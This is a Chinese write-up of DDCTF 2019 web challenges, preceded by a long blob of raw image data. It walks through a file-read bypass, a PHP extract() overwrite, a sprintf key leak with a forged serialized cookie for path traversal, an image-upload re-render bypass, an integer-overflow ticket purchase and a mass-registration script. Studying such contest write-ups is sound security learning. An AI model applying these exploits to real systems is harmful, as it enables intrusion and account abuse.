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&apos;&gt;&lt;/img&gt; 于是在思考是否可以构造index.php来读取源码 构造urlhttp://117.51.150.246/index.php?jpg=TmprMlJUWTBOalUzT0RKRk56QTJPRGN3获取了index.php的源码1234567891011121314151617181920212223242526&lt;?php/* * https://blog.csdn.net/FengBanLiuYun/article/details/80616607 * Date: July 4,2018 */error_reporting(E_ALL || ~E_NOTICE);header(&apos;content-type:text/html;charset=utf-8&apos;);if(! isset($_GET[&apos;jpg&apos;])) header(&apos;Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09&apos;);$file = hex2bin(base64_decode(base64_decode($_GET[&apos;jpg&apos;])));echo &apos;&lt;title&gt;&apos;.$_GET[&apos;jpg&apos;].&apos;&lt;/title&gt;&apos;;$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;,&quot;&quot;, $file);echo $file.&apos;&lt;/br&gt;&apos;;$file = str_replace(&quot;config&quot;,&quot;!&quot;, $file);echo $file.&apos;&lt;/br&gt;&apos;;$txt = base64_encode(file_get_contents($file));echo &quot;&lt;img src=&apos;data:image/gif;base64,&quot;.$txt.&quot;&apos;&gt;&lt;/img&gt;&quot;;/* * Can you find the flag file? * */?&gt; 发现提示给了一篇博客地址和一个日期 让我们找到了这样的一篇文章 尝试了多次之后发现是 http://117.51.150.246/practice.txt.swp 发现了f1ag!ddctf.php于是想读取他的源码由于index页面做过限制,·file参数只能输入字母和数字,但是他将config替换为!于是构造f1agconfigddctf.php来进行绕过。base64解密就能得到源码 123456789101112131415161718&lt;?phpinclude(&apos;config.php&apos;);$k = &apos;hello&apos;;extract($_GET);if(isset($uid))&#123; $content=trim(file_get_contents($k)); if($uid==$content) &#123; echo $flag; &#125; else &#123; echo&apos;hello&apos;; &#125;&#125;?&gt; 审计一下 发现可以绕过 得到flag1DDCTF&#123;436f6e67726174756c6174696f6e73&#125; web签到题打开页面发现没有登陆权限 查看源代码发现了index.js里面的内容 1234567891011121314151617181920212223242526/** * Created by PhpStorm. * User: didi * Date: 2019/1/13 * Time: 9:05 PM */function auth() &#123; $.ajax(&#123; type: &quot;post&quot;, url:&quot;http://117.51.158.44/app/Auth.php&quot;, contentType: &quot;application/json;charset=utf-8&quot;, dataType: &quot;json&quot;, beforeSend: function (XMLHttpRequest) &#123; XMLHttpRequest.setRequestHeader(&quot;didictf_username&quot;, &quot;&quot;); &#125;, success: function (getdata) &#123; console.log(getdata); if(getdata.data !== &apos;&apos;) &#123; document.getElementById(&apos;auth&apos;).innerHTML = getdata.data; &#125; &#125;,error:function(error)&#123; console.log(error); &#125; &#125;);&#125; 发现了app/Auth.php页面，而且发现了head头可以有didictf_username 尝试在app/Auth.php页面伪造header头didictf_username:admin 访问app/fL2XID2i0Cdh.php页面发现题目的源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169url:app/Application.phpClass Application &#123; var $path = &apos;&apos;; public function response($data, $errMsg = &apos;success&apos;) &#123; $ret = [&apos;errMsg&apos; =&gt; $errMsg, &apos;data&apos; =&gt; $data]; $ret = json_encode($ret); header(&apos;Content-type: application/json&apos;); echo $ret; &#125; public function auth() &#123; $DIDICTF_ADMIN = &apos;admin&apos;; if(!empty($_SERVER[&apos;HTTP_DIDICTF_USERNAME&apos;]) &amp;&amp; $_SERVER[&apos;HTTP_DIDICTF_USERNAME&apos;] == $DIDICTF_ADMIN) &#123; $this-&gt;response(&apos;您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php&apos;); return TRUE; &#125;else&#123; $this-&gt;response(&apos;抱歉，您没有登陆权限，请获取权限后访问-----&apos;,&apos;error&apos;); exit(); &#125; &#125; private function sanitizepath($path) &#123; $path = trim($path); $path=str_replace(&apos;../&apos;,&apos;&apos;,$path); $path=str_replace(&apos;..\\\\&apos;,&apos;&apos;,$path); return $path;&#125;public function __destruct() &#123; if(empty($this-&gt;path)) &#123; exit(); &#125;else&#123; $path = $this-&gt;sanitizepath($this-&gt;path); if(strlen($path) !== 18) &#123; exit(); &#125; $this-&gt;response($data=file_get_contents($path),&apos;Congratulations&apos;); &#125; exit();&#125;&#125;url:app/Session.phpinclude &apos;Application.php&apos;;class Session extends Application &#123; //key建议为8位字符串 var $eancrykey = &apos;&apos;; var $cookie_expiration = 7200; var $cookie_name = &apos;ddctf_id&apos;; var $cookie_path = &apos;&apos;; var $cookie_domain = &apos;&apos;; var $cookie_secure = FALSE; var $activity = &quot;DiDiCTF&quot;; public function index() &#123; if(parent::auth()) &#123; $this-&gt;get_key(); if($this-&gt;session_read()) &#123; $data = &apos;DiDI Welcome you %s&apos;; $data = sprintf($data,$_SERVER[&apos;HTTP_USER_AGENT&apos;]); parent::response($data,&apos;sucess&apos;); &#125;else&#123; $this-&gt;session_create(); $data = &apos;DiDI Welcome you&apos;; parent::response($data,&apos;sucess&apos;); &#125; &#125; &#125; private function get_key() &#123; //eancrykey and flag under the folder $this-&gt;eancrykey = file_get_contents(&apos;../config/key.txt&apos;); &#125; public function session_read() &#123; if(empty($_COOKIE)) &#123; return FALSE; &#125; $session = $_COOKIE[$this-&gt;cookie_name]; if(!isset($session)) &#123; parent::response(&quot;session not found&quot;,&apos;error&apos;); return FALSE; &#125; $hash = substr($session,strlen($session)-32); $session = substr($session,0,strlen($session)-32); if($hash !== md5($this-&gt;eancrykey.$session)) &#123; parent::response(&quot;the cookie data not match&quot;,&apos;error&apos;); return FALSE; &#125; $session = unserialize($session); if(!is_array($session) OR !isset($session[&apos;session_id&apos;]) OR !isset($session[&apos;ip_address&apos;]) OR !isset($session[&apos;user_agent&apos;]))&#123; return FALSE; &#125; if(!empty($_POST[&quot;nickname&quot;])) &#123; $arr = array($_POST[&quot;nickname&quot;],$this-&gt;eancrykey); $data = &quot;Welcome my friend %s&quot;; foreach ($arr as $k =&gt; $v) &#123; $data = sprintf($data,$v); &#125; parent::response($data,&quot;Welcome&quot;); &#125; if($session[&apos;ip_address&apos;] != $_SERVER[&apos;REMOTE_ADDR&apos;]) &#123; parent::response(&apos;the ip addree not match&apos;.&apos;error&apos;); return FALSE; &#125; if($session[&apos;user_agent&apos;] != $_SERVER[&apos;HTTP_USER_AGENT&apos;]) &#123; parent::response(&apos;the user agent not match&apos;,&apos;error&apos;); return FALSE; &#125; return TRUE; &#125; private function session_create() &#123; $sessionid = &apos;&apos;; while(strlen($sessionid) &lt; 32) &#123; $sessionid .= mt_rand(0,mt_getrandmax()); &#125; $userdata = array( &apos;session_id&apos; =&gt; md5(uniqid($sessionid,TRUE)), &apos;ip_address&apos; =&gt; $_SERVER[&apos;REMOTE_ADDR&apos;], &apos;user_agent&apos; =&gt; $_SERVER[&apos;HTTP_USER_AGENT&apos;], &apos;user_data&apos; =&gt; &apos;&apos;, ); $cookiedata = serialize($userdata); $cookiedata = $cookiedata.md5($this-&gt;eancrykey.$cookiedata); $expire = $this-&gt;cookie_expiration + time(); setcookie( $this-&gt;cookie_name, $cookiedata, $expire, $this-&gt;cookie_path, $this-&gt;cookie_domain, $this-&gt;cookie_secure ); &#125;&#125;$ddctf = new Session();$ddctf-&gt;index(); 其中发现了已一些危险函数unserialize，以及file_get_contents等等 这里存在类的反序列化应用 猜测flag可能藏在../config/key.txt里面 大概知道题目的大概流程为： 通过session反序列化 –&gt;创建Application对象–&gt; 控制path –&gt; getfalg 12345678910111213$session = $_COOKIE[$this-&gt;cookie_name]; if(!isset($session)) &#123; parent::response(&quot;session not found&quot;,&apos;error&apos;); return FALSE; &#125; $hash = substr($session,strlen($session)-32); $session = substr($session,0,strlen($session)-32); if($hash !== md5($this-&gt;eancrykey.$session)) &#123; parent::response(&quot;the cookie data not match&quot;,&apos;error&apos;); return FALSE; &#125; $session = unserialize($session); 细看代码，发现签名规则是md5(eancrykey+session)，也就是说，我们要想获得cookie控制权，必须得到eancrykey。通读代码，分析eancrykey出现地点。最终发现两个可疑点 eancrykey存放目录为../config/key.txt。 由于不在web目录且没有读文件的漏洞，此时攻击者不可获取。 某处代码中的调用 本地测试了一下 sprintf函数 1234567891011121314&lt;?php $data=&quot;Welcome my friend %s&quot;;$arr=array(&apos;chuddy&apos;,&apos;chuddy123&apos;);foreach ($arr as $value) &#123; echo sprintf($data,$value).&quot;&lt;br&gt;&quot;;&#125;?&gt;输出结果为：Welcome my friend chuddyWelcome my friend chuddy123 于是想到构造方法：nickname=%s就可以得到eancrykey的值 然后就是伪造一个session值：1234567891011121314151617 private function sanitizepath($path) &#123; $path = trim($path); $path=str_replace(&apos;../&apos;,&apos;&apos;,$path); $path=str_replace(&apos;..\\\\&apos;,&apos;&apos;,$path); return $path;&#125;public function __destruct() &#123; if(empty($this-&gt;path)) &#123; exit(); &#125;else&#123; $path = $this-&gt;sanitizepath($this-&gt;path); if(strlen($path) !== 18) &#123; exit(); &#125; $this-&gt;response($data=file_get_contents($path),&apos;Congratulations&apos;); &#125; 发现这个path值 过滤了../可以进行双写绕过 于是构造Application类1234567891011121314 &lt;?phpclass Application&#123; var $session_id = &apos;5c5d2e08abcb1f7f32228b19935a9fb5&apos;; var $ip_address = &apos;117.158.83.66&apos;; var $user_agent = &apos;Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:66.0)+Gecko/20100101+Firefox/66.0&apos;; var $user_data = &apos;&apos;; var $path = &apos;....//config/flag.txt&apos;;&#125;$a = new Application();$a = serialize($a);echo urlencode($a.md5(&apos;EzblrbNS&apos;.$a));?&gt; 得到flag1DDCTF&#123;ddctf2019_G4uqwj6E_pHVlHIDDGdV8qA2j&#125; Upload-IMG打开页面发现是一个文件上传的题目 先随便传一个图片看一下 发现这个是需要经过二次渲染之后 还能找到 phpinfo() 这一串字符串 让我想到了 以前做过的 upload-labs的第十六关 二次渲染绕过 参考了当时讲课的时候的学长的博客 于是开始制作一个 能过绕过二次渲染的图片 首先保存一个 已经被渲染的图片 命名为 1.jpg 然后用脚本开始跑图片其中关键字改为phpinfo()就可以了1php phpinfo.php 1.jpg 制作完成一张 合格的图片 然后上传 就会得到flag： 大吉大利，今晚吃鸡打开页面是一个 类似吃鸡模式的游戏 首先获得入场券，然后淘汰其他选手就能获得flag 首先购买入场券 通过抓包发现ticket_price=2000这个参数可以进行修改，但是只能改大不能改小，于是想到了php的整形溢出 令ticket_price=4294967296 就可以买到入场券 进入游戏 然后想到了利用python写脚本注册大量的用户 然后再把它们移除 脚本为：123456789101112131415161718192021222324252627282930313233import reimport requestsimport sysreload(sys)sys.setdefaultencoding(&quot;utf8&quot;)id = open(&quot;1.txt&quot;, &quot;a&quot;)ticket = open(&quot;2.txt&quot;,&quot;a&quot;) for i in range(150): register_url = &quot;http://117.51.147.155:5050/ctf/api/register&quot; r = requests.session() register_playload = &quot;?name=chuddy1234chuddy123chuddy123chuddy123chuddy123&quot;+str(i)+&quot;&amp;password=123456789a&quot; # print register_playload s = r.get(url=register_url+register_playload) # print s.text tick_url = &quot;http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967296&quot; tick = r.get(url=tick_url) a = tick.text bill_id = re.search(r&apos;id&quot;:&quot;(.*)&quot;,&quot;tick&apos;,a).group(1) # print bill_id pay_url = &quot;http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id=&quot;+bill_id pay = r.get(url=pay_url) success = &apos;&#123;&quot;code&quot;:200,&quot;data&quot;:[&#123;&quot;your_id&quot;:75,&quot;your_ticket&quot;:&quot;4c529f4afa586f5d8e1e8bd89a6f28dd&quot;&#125;],&quot;msg&quot;:&quot;\\u4ea4\\u6613\\u6210\\u529f&quot;&#125;&apos; pay_id1 = re.search(r&apos;your_id&quot;:(.*),&quot;you&apos;,pay.text).group(1) pay_ticket1 = re.search(r&apos;your_ticket&quot;:&quot;(.*)&quot;&#125;],&quot;msg&quot;&apos;,pay.text).group(1) print pay_id1 print pay_ticket1 id.write(pay_id1) id.write(&quot;\\n&quot;) ticket.write(pay_ticket1) ticket.write(&quot;\\n&quot;) 这个可以获得大量的注册的用户，再用bp跑一下 将他们清除掉就可以获得flag了 跑完脚本就能得到flag了 